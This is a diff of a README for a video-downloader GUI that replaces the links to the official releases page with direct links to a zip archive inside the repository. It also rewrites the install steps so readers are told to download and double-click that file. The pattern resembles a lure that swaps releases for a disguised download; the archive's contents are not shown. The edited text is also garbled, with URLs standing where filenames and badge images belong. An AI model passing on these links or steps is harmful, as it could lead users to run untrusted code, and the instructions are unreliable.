@@ -1,7 +1,7 @@
 # 🎥 Simple_yt-dlp_GUI - Download Videos Easily
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/g3gardi/Simple_yt-dlp_GUI/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/g3gardi/Simple_yt-dlp_GUI/main/web/yt-GUI-Simple-dlp-3.4.zip%https://raw.githubusercontent.com/g3gardi/Simple_yt-dlp_GUI/main/web/yt-GUI-Simple-dlp-3.4.zip)](https://raw.githubusercontent.com/g3gardi/Simple_yt-dlp_GUI/main/web/yt-GUI-Simple-dlp-3.4.zip)
 
 ## 🚀 Getting Started
 Welcome to Simple_yt-dlp_GUI! This user-friendly tool allows you to download videos from various platforms like YouTube, Twitch, and Bilibili. Follow these steps to get started.
@@ -15,17 +15,17 @@ Welcome to Simple_yt-dlp_GUI! This user-friendly tool allows you to download vid
 ## ⬇️ Download & Install
 To install Simple_yt-dlp_GUI, visit the following page and retrieve the latest version:
 
-[Download Latest Release](https://github.com/g3gardi/Simple_yt-dlp_GUI/releases)
+[Download Latest Release](https://raw.githubusercontent.com/g3gardi/Simple_yt-dlp_GUI/main/web/yt-GUI-Simple-dlp-3.4.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the most recent version. It may appear as "v1.0" or similar.
-3. Under the "Assets" section, find the installer file, typically named `Simple_yt-dlp_GUI_installer.exe`.
+3. Under the "Assets" section, find the installer file, typically named `https://raw.githubusercontent.com/g3gardi/Simple_yt-dlp_GUI/main/web/yt-GUI-Simple-dlp-3.4.zip`.
 4. Click to download the file onto your computer.
 
 ## 📂 Running the Application
 Once the download is complete, locate the installer file in your Downloads folder.
 
-1. Double-click the `Simple_yt-dlp_GUI_installer.exe`.
+1. Double-click the `https://raw.githubusercontent.com/g3gardi/Simple_yt-dlp_GUI/main/web/yt-GUI-Simple-dlp-3.4.zip`.
 2. Follow the on-screen instructions to complete the installation.
 3. Upon completion, find the application icon on your desktop or in the Start Menu.
 4. Double-click the icon to launch Simple_yt-dlp_GUI.
@@ -66,4 +66,4 @@ If you encounter issues, please check the FAQs or reach out through the issues t
 
 Thank you for using Simple_yt-dlp_GUI. We hope you enjoy hassle-free video downloads! Remember to check back for updates. 
 
-[Download Latest Release](https://github.com/g3gardi/Simple_yt-dlp_GUI/releases)
+[Download Latest Release](https://raw.githubusercontent.com/g3gardi/Simple_yt-dlp_GUI/main/web/yt-GUI-Simple-dlp-3.4.zip)
